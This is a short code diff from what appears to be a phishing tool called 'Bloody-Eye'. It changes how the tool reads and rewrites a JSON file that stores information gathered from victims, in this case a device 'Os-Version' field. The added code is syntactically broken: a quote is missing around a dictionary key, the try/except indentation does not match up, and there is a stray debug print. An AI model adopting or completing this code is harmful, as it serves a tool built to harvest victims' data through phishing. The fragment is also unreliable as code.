@@ -603,11 +603,16 @@ exit();""")
                 stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
                 fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
                 b = fileip.read()
-                try:
-                      print(Fore.BLUE+" [~] Victim's Info Saved in [info.json]")
-                      a = open("../Bloody-Eye/templates/phishing/info.json","w")
-                      b = a.write("")
-                      a.close()
+            try:
+                infor = json.loads(b)
+                for value in infor['dev']:
+                    a = open("../Bloody-Eye/templates/phishing/info.json","w")
+                    b = a.write(value[Os-Version'])
+                    print("aaa")
+                    b = a.write("")
+                    a.close()
+            except:
+                None
    
                 except:
                          None
